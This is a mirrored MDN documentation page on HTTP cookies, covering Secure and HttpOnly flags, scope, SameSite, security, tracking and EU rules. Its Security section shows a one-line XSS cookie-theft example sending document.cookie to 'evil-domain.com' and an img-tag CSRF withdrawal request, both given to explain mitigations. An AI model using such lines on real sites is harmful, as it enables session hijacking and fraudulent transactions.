+&lt;p&gt;A secure cookie will only be sent to the server when a request is made using SSL and the HTTPS protocol. However, note that confidential or sensitive information should &lt;em&gt;never&lt;/em&gt; be stored or transmitted in HTTP Cookies as the entire mechanism is inherently insecure and this flag won&#39;t offer you any additional encryption or security.&lt;/p&gt;
+
+&lt;p&gt;To prevent cross-site scripting ({{Glossary(&#34;XSS&#34;)}}) attacks, HTTP-only cookies aren&#39;t accessible via JavaScript through the {{domxref(&#34;Document.cookie&#34;)}} property, the {{domxref(&#34;XMLHttpRequest&#34;)}} and {{domxref(&#34;Request&#34;)}} APIs. Set this flag when you don&#39;t need your cookies available in JavaScript. In particular, if you use cookies only to define a session, you don&#39;t need it in JavaScript and the &lt;code&gt;HttpOnly&lt;/code&gt; flag should be set.&lt;/p&gt;
+
+&lt;pre&gt;
+Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly&lt;/pre&gt;
+
+&lt;h3 id=&#34;Scope_of_cookies&#34;&gt;Scope of cookies&lt;/h3&gt;
+
+&lt;p&gt;The &lt;code&gt;Domain&lt;/code&gt; and &lt;code&gt;Path&lt;/code&gt; directives define the &lt;em&gt;scope&lt;/em&gt; of the cookie, that is the set of URLs the cookies should be sent&amp;nbsp;back to.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;Domain&lt;/code&gt; specifies those hosts to which the cookie will be sent. If not specified, defaults to the host portion of the current document location (but not including subdomains). If a domain is specified, subdomains are always included.&lt;/p&gt;
+
+&lt;p&gt;If &lt;code&gt;Domain=mozilla.org&lt;/code&gt; is set, cookies are included on subdomains like &lt;code&gt;developer.mozilla.org&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;Path&lt;/code&gt; indicates a URL path that must exist in the requested resource before sending the &lt;code&gt;Cookie&lt;/code&gt; header. The %x2F (&#34;/&#34;) character is interpreted as a directory separator and sub directories will be matched as well.&lt;/p&gt;
+
+&lt;p&gt;If &lt;code&gt;Path=/docs&lt;/code&gt; is set, these paths will all be matched:&lt;/p&gt;
+
+&lt;ul&gt;
+ &lt;li&gt;&#34;/docs&#34;,&lt;/li&gt;
+ &lt;li&gt;&#34;/docs/Web/&#34;,&lt;/li&gt;
+ &lt;li&gt;&#34;/docs/Web/HTTP&#34;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;SameSite_cookies_experimental_inline&#34;&gt;&lt;code&gt;SameSite&lt;/code&gt; cookies&amp;nbsp;{{experimental_inline}}&lt;/h3&gt;
+
+&lt;p&gt;&lt;code&gt;SameSite&lt;/code&gt; cookies allow servers to assert that a cookie ought not to be sent along with cross-site requests, which provides some protection against cross-site request forgery attacks ({{Glossary(&#34;CSRF&#34;)}}). &lt;code&gt;SameSite&lt;/code&gt; cookies are still experimental and not yet supported by all browsers.&lt;/p&gt;
+
+&lt;h3 id=&#34;JavaScript_access_using_Document.cookies&#34;&gt;JavaScript access using Document.cookies&lt;/h3&gt;
+
+&lt;p&gt;New cookies can also be created using the {{domxref(&#34;Document.cookie&#34;)}} property, and if the &lt;code&gt;HttpOnly&lt;/code&gt; flag is not set, existing cookies can be accessed from JavaScript as well.&lt;/p&gt;
+
+&lt;pre class=&#34;brush: js&#34;&gt;
+document.cookie = &#34;yummy_cookie=choco&#34;; 
+document.cookie = &#34;tasty_cookie=strawberry&#34;; 
+console.log(document.cookie); 
+// logs &#34;yummy_cookie=choco; tasty_cookie=strawberry&#34;&lt;/pre&gt;
+
+&lt;p&gt;Please note the security implications as noted in the &lt;a href=&#34;/en-US/docs/Web/HTTP/Cookies#Security&#34;&gt;Security&lt;/a&gt; section below. Cookies that are available to JavaScript might get stolen through XSS.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;Security&#34;&gt;Security&lt;/h2&gt;
+
+&lt;div class=&#34;note&#34;&gt;
+&lt;p&gt;Confidential or sensitive information should never be stored or transmitted in HTTP Cookies as the entire mechanism is inherently insecure.&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&#34;Session_hijacking_and_XSS&#34;&gt;Session hijacking and XSS&lt;/h3&gt;
+
+&lt;p&gt;Cookies are often used in web application to identify a user and their authenticated session. So stealing a cookie from a web application can lead to hijacking the authenticated user&#39;s session. Common ways to steal cookies include using Social Engineering or by exploiting an {{Glossary(&#34;XSS&#34;)}} vulnerability in the application.&lt;/p&gt;
+
+&lt;pre class=&#34;brush: js&#34;&gt;
+(new Image()).src = &#34;http://www.evil-domain.com/steal-cookie.php?cookie=&#34; + document.cookie;&lt;/pre&gt;
+
+&lt;p&gt;The &lt;code&gt;HttpOnly&lt;/code&gt; cookie attribute can help to mitigate this attack by preventing access to cookie value through JavaScript.&lt;/p&gt;
+
+&lt;h3 id=&#34;Cross-site_request_forgery_(CSRF)&#34;&gt;Cross-site request forgery (CSRF)&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery&#34;&gt;Wikipedia&lt;/a&gt; mentions a good example for {{Glossary(&#34;CSRF&#34;)}}. In this situation, someone includes an image that isn’t really an image (for example in an unfiltered chat or forum), instead it really is a request to your bank’s server to withdraw money:&lt;/p&gt;
+
+&lt;pre class=&#34;brush: html&#34;&gt;
+&amp;lt;img src=&#34;http://bank.example.com/withdraw?account=bob&amp;amp;amount=1000000&amp;amp;for=mallory&#34;&amp;gt;&lt;/pre&gt;
+
+&lt;p&gt;Now, if you are logged into your bank account and your cookies are still valid (and there is no other validation), you will transfer money as soon as you load the HTML that contains this image. There are a few techniques that are used to prevent this from happening:&lt;/p&gt;
+
+&lt;ul&gt;
+ &lt;li&gt;As with {{Glossary(&#34;XSS&#34;)}}, input filtering is import.&lt;/li&gt;
+ &lt;li&gt;There should always be a confirmation required for any sensitive action.&lt;/li&gt;
+ &lt;li&gt;Cookies that are used for sensitive actions should have a short lifetime only.&lt;/li&gt;
+ &lt;li&gt;For more prevention tips, see the &lt;a href=&#34;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet&#34;&gt;OWASP CSRF prevention cheat sheet&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;Tracking_and_privacy&#34;&gt;Tracking and privacy&lt;/h2&gt;
+
+&lt;h3 id=&#34;Third-party_cookies&#34;&gt;Third-party cookies&lt;/h3&gt;
+
+&lt;p&gt;Cookies have a domain associated to them. If this domain is the same as the domain of the page you are on, the cookies is said to be a &lt;em&gt;first-party cookie&lt;/em&gt;. If the domain is different, it is said to be a &lt;em&gt;third-party cookie&lt;/em&gt;. While first-party cookies are sent only to the server setting them, a web page may contain images or other components stored on servers in other domains (like ad banners). Cookies that are sent through these third-party components are called third-party cookies and are mainly used for advertising and tracking across the web. See for example the &lt;a href=&#34;https://www.google.com/policies/technologies/types/&#34;&gt;types of cookies used by Google&lt;/a&gt;. Most browsers allow third-party cookies by default, but there are add-ons available to block them (for example, &lt;a href=&#34;https://addons.mozilla.org/en-US/firefox/addon/privacy-badger-firefox/&#34;&gt;Privacy Badger&lt;/a&gt; by the &lt;a href=&#34;https://www.eff.org/&#34;&gt;EFF&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;If you are not disclosing third-party cookies, consumer trust might get harmed if cookie use is discovered. A clear disclosure (such as in a privacy policy) tends to eliminate any negative effects of a cookie discovery. Some countries also have legislation about cookies. See for example Wikipedia&#39;s &lt;a href=&#34;https://wikimediafoundation.org/wiki/Cookie_statement&#34;&gt;cookie statement&lt;/a&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;Do-Not-Track&#34;&gt;Do-Not-Track&lt;/h3&gt;
+
+&lt;p&gt;There are no legal or technological requirements for its use, but the {{HTTPHeader(&#34;DNT&#34;)}} header can be used to signal that a web application should disable either its tracking or cross-site user tracking of an individual user. See the {{HTTPHeader(&#34;DNT&#34;)}} header for more information.&lt;/p&gt;
+
+&lt;h3 id=&#34;EU_cookie_directive&#34;&gt;EU cookie directive&lt;/h3&gt;
+
+&lt;p&gt;Requirements for cookies across the EU are defined in &lt;a href=&#34;http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136&#34;&gt;Directive 2009/136/EC&lt;/a&gt; of the European Parliament and came into effect on 25 May 2011. A directive is not a law by itself, but a requirement for EU member states to put laws in place that meet the requirements of the directive. The actual laws can differ from country to country.&lt;/p&gt;
+
+&lt;p&gt;In short the EU directive means that before somebody can store or retrieve any information from a computer, mobile phone or other device, the user must give informed consent to do so. Many websites have added banners since then to inform the user about the use of cookies.&lt;/p&gt;
+
+&lt;p&gt;For more, see &lt;a href=&#34;https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive&#34;&gt;this Wikipedia section&lt;/a&gt; and consult state laws for the latest and most accurate information.&lt;/p&gt;
+
+&lt;h3 id=&#34;Zombie_cookies_and_Evercookies&#34;&gt;Zombie cookies and Evercookies&lt;/h3&gt;
+
+&lt;p&gt;A more radical approach to cookies are zombie cookies or &#34;Evercookies&#34; which are recreated after their deletion and are intentionally hard to delete forever. They are using the &lt;a href=&#34;/en-US/docs/Web/API/Web_Storage_API&#34; title=&#34;DOM Storage&#34;&gt;Web storage API&lt;/a&gt;, Flash Local Shared Objects and other techniques to recreate themselves whenever the cookie&#39;s absence is detected.&lt;/p&gt;
+
+&lt;ul&gt;
+ &lt;li&gt;&lt;a href=&#34;https://github.com/samyk/evercookie&#34;&gt;Evercookie by Samy Kamkar&lt;/a&gt;&lt;/li&gt;
+ &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Zombie_cookie&#34;&gt;Zombie cookies on Wikipedia&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;See_also&#34;&gt;See also&lt;/h2&gt;
+
+&lt;ul&gt;
+ &lt;li&gt;{{HTTPHeader(&#34;Set-Cookie&#34;)}}&lt;/li&gt;
+ &lt;li&gt;{{HTTPHeader(&#34;Cookie&#34;)}}&lt;/li&gt;
+ &lt;li&gt;{{domxref(&#34;Document.cookie&#34;)}}&lt;/li&gt;
+ &lt;li&gt;{{domxref(&#34;Navigator.cookieEnabled&#34;)}}&lt;/li&gt;
+ &lt;li&gt;&lt;a href=&#34;/en-US/docs/Tools/Storage_Inspector&#34;&gt;Inspecting cookies using the Storage Inspector&lt;/a&gt;&lt;/li&gt;
+ &lt;li&gt;&lt;a class=&#34;external&#34; href=&#34;https://tools.ietf.org/html/rfc6265&#34;&gt;Cookie specification: RFC 6265&lt;/a&gt;&lt;/li&gt;
+ &lt;li&gt;&lt;a class=&#34;external&#34; href=&#34;https://www.nczonline.net/blog/2009/05/05/http-cookies-explained/&#34;&gt;Nicholas Zakas article on cookies&lt;/a&gt;&lt;/li&gt;
+ &lt;li&gt;&lt;a class=&#34;external&#34; href=&#34;https://www.nczonline.net/blog/2009/05/12/cookies-and-security/&#34;&gt;Nicholas Zakas article on cookies and security&lt;/a&gt;&lt;/li&gt;
+ &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/HTTP_cookie&#34;&gt;HTTP cookie on Wikipedia&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</pre>
+      </div>
+    </details>
+
+    
+    <a href="https://developer.mozilla.org/en-US/users/signin?next=/en-US/docs/Web/HTTP/Cookies%24revert/1143319" class="button" rel="nofollow, noindex">Revert to this revision</a>
+    
+  </article>
+
+  </div></main>
+
+  <!-- Footer -->
+  <footer id="main-footer"><div class="center">
+    <div class="column-container">
+      <div class="column-main">
+        
+        <div class="contentinfo">
+          <p>&copy; 2005-2016 Mozilla Developer Network and individual contributors.</p> <p>Content is available under <a href="https://developer.mozilla.org/en-US/docs/MDN/About#Copyrights_and_licenses">these licenses</a>.</p>
+          <ul>
+            <li><a href="https://developer.mozilla.org/docs/MDN/About">About MDN</a></li>
+            <li><a href="http://www.mozilla.org/about/legal/terms/mozilla">Terms</a></li>
+            <li><a href="http://www.mozilla.org/privacy/websites/">Privacy</a></li>
+            <li><a href="http://www.mozilla.org/privacy/websites/#cookies">Cookies</a></li>
+            <li><a href="http://github.com/mozilla/kuma">Contribute to the code</a></li>
+          </ul>
+        </div>
+        
+      </div>
+      <div class="column-strip">
+        
+          
+              
+
+<form class="languages go" method="get" action="#">
+  <label for="language">Other languages:</label>
+  
+  <select id="language" class="autosubmit" name="lang">
+    <option title="English (US)" value="en-US">
+      English (US) (en-US)
+    </option>
+    
+        <option title="Afrikaans" value="af">
+          Afrikaans (af)
+        </option>
+      
+        <option title="Arabic" value="ar">
+          عربي (ar)
+        </option>
+      
+        <option title="Azerbaijani" value="az">
+          Azərbaycanca (az)
+        </option>
+      
+        <option title="Bambara" value="bm">
+          Bamanankan (bm)
+        </option>
+      
+        <option title="Bengali (Bangladesh)" value="bn-BD">
+          বাংলা (বাংলাদেশ) (bn-BD)
+        </option>
+      
+        <option title="Bengali (India)" value="bn-IN">
+          বাংলা (ভারত) (bn-IN)
+        </option>
+      
+        <option title="Catalan" value="ca">
+          Català (ca)
+        </option>
+      
+        <option title="Czech" value="cs">
+          Čeština (cs)
+        </option>
+      
+        <option title="German" value="de">
+          Deutsch (de)
+        </option>
+      
+        <option title="Ewe" value="ee">
+          Eʋe (ee)
+        </option>
+      
+        <option title="Greek" value="el">
+          Ελληνικά (el)
+        </option>
+      
+        <option title="Spanish" value="es">
+          Español (es)
+        </option>
+      
+        <option title="Persian" value="fa">
+          فارسی (fa)
+        </option>
+      
+        <option title="Fulah" value="ff">
+          Pulaar-Fulfulde (ff)
+        </option>
+      
+        <option title="Finnish" value="fi">
+          suomi (fi)
+        </option>
+      
+        <option title="French" value="fr">
+          Français (fr)
+        </option>
+      
+        <option title="Frisian" value="fy-NL">
+          Frysk (fy-NL)
+        </option>
+      
+        <option title="Irish" value="ga-IE">
+          Gaeilge (ga-IE)
+        </option>
+      
+        <option title="Hausa" value="ha">
+          Hausa (ha)
+        </option>
+      
+        <option title="Hebrew" value="he">
+          עברית (he)
+        </option>
+      
+        <option title="Hindi (India)" value="hi-IN">
+          हिन्दी (भारत) (hi-IN)
+        </option>
+      
+        <option title="Croatian" value="hr">
+          Hrvatski (hr)
+        </option>
+      
+        <option title="Hungarian" value="hu">
+          magyar (hu)
+        </option>
+      
+        <option title="Indonesian" value="id">
+          Bahasa Indonesia (id)
+        </option>
+      
+        <option title="Igbo" value="ig">
+          Igbo (ig)
+        </option>
+      
+        <option title="Italian" value="it">
+          Italiano (it)
+        </option>
+      
+        <option title="Japanese" value="ja">
+          日本語 (ja)
+        </option>
+      
+        <option title="Georgian" value="ka">
+          ქართული (ka)
+        </option>
+      
+        <option title="Kabyle" value="kab">
+          Taqbaylit (kab)
+        </option>
+      
+        <option title="Korean" value="ko">
+          한국어 (ko)
+        </option>
+      
+        <option title="Lingala" value="ln">
+          Lingála (ln)
+        </option>
+      
+        <option title="Malagasy" value="mg">
+          Malagasy (mg)
+        </option>
+      
+        <option title="Malayalam" value="ml">
+          മലയാളം (ml)
+        </option>
+      
+        <option title="Malay" value="ms">
+          Melayu (ms)
+        </option>
+      
+        <option title="Burmese" value="my">
+          မြန်မာဘာသာ (my)
+        </option>
+      
+        <option title="Dutch" value="nl">
+          Nederlands (nl)
+        </option>
+      
+        <option title="Polish" value="pl">
+          Polski (pl)
+        </option>
+      
+        <option title="Portuguese (Brazilian)" value="pt-BR">
+          Português (do Brasil) (pt-BR)
+        </option>
+      
+        <option title="Portuguese (Portugal)" value="pt-PT">
+          Português (Europeu) (pt-PT)
+        </option>
+      
+        <option title="Romanian" value="ro">
+          Română (ro)
+        </option>
+      
+        <option title="Russian" value="ru">
+          Русский (ru)
+        </option>
+      
+        <option title="Songhai" value="son">
+          Soŋay (son)
+        </option>
+      
+        <option title="Albanian" value="sq">
+          Shqip (sq)
+        </option>
+      
+        <option title="Serbian" value="sr">
+          Српски (sr)
+        </option>
+      
+        <option title="Serbian" value="sr-Latn">
+          Srpski (sr-Latn)
+        </option>
+      
+        <option title="Swedish" value="sv-SE">
+          Svenska (sv-SE)
+        </option>
+      
+        <option title="Swahili" value="sw">
+          Kiswahili (sw)
+        </option>
+      
+        <option title="Tamil" value="ta">
+          தமிழ் (ta)
+        </option>
+      
+        <option title="Thai" value="th">
+          ไทย (th)
+        </option>
+      
+        <option title="Tagalog" value="tl">
+          Tagalog (tl)
+        </option>
+      
+        <option title="Tswana" value="tn">
+          Setswana (tn)
+        </option>
+      
+        <option title="Turkish" value="tr">
+          Türkçe (tr)
+        </option>
+      
+        <option title="Ukrainian" value="uk">
+          Українська (uk)
+        </option>
+      
+        <option title="Vietnamese" value="vi">
+          Tiếng Việt (vi)
+        </option>
+      
+        <option title="Wolof" value="wo">
+          Wolof (wo)
+        </option>
+      
+        <option title="Xhosa" value="xh">
+          isiXhosa (xh)
+        </option>
+      
+        <option title="Yoruba" value="yo">
+          Yorùbá (yo)
+        </option>
+      
+        <option title="Chinese (Simplified)" value="zh-CN">
+          中文 (简体) (zh-CN)
+        </option>
+      
+        <option title="Chinese (Traditional)" value="zh-TW">
+          正體中文 (繁體) (zh-TW)
+        </option>
+      
+        <option title="Zulu" value="zu">
+          isiZulu (zu)
+        </option>
+      
+  </select>
+  <noscript><button type="submit">Go</button></noscript>
+</form>
+          
+        
+      </div>
+    </div>
+  </div></footer>
+
+  <!-- site js -->
+  
+    
+    <!--[if lte IE 8]><script type="text/javascript" src="https://developer.cdn.mozilla.net/static/build/js/selectivizr.091e18cf669b.js" charset="utf-8"></script><![endif]-->
+
+    
+    <script type="text/javascript" src="../../../../../../developer.cdn.mozilla.net/static/build/js/main.69644b44d458.js" charset="utf-8"></script>
+    
+      <script>
+        if(window.mdn && mdn.analytics) mdn.analytics.trackOutboundLinks();
+      </script>
+    
+    
+    <script type="text/javascript" src="../../../../../../developer.cdn.mozilla.net/static/jsi18n/en-us/javascript.b28203373cc1.js"></script>
+  
+    <script async type="text/javascript" src="../../../../../../developer.cdn.mozilla.net/static/build/js/wiki.d85ddd33511e.js" charset="utf-8"></script>
+
+
+  
+</body>
+
+<!-- Mirrored from developer.mozilla.org/en-US/docs/Web/HTTP/Cookies$revision/1143319 by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 02 Dec 2016 16:47:31 GMT -->
+</html>
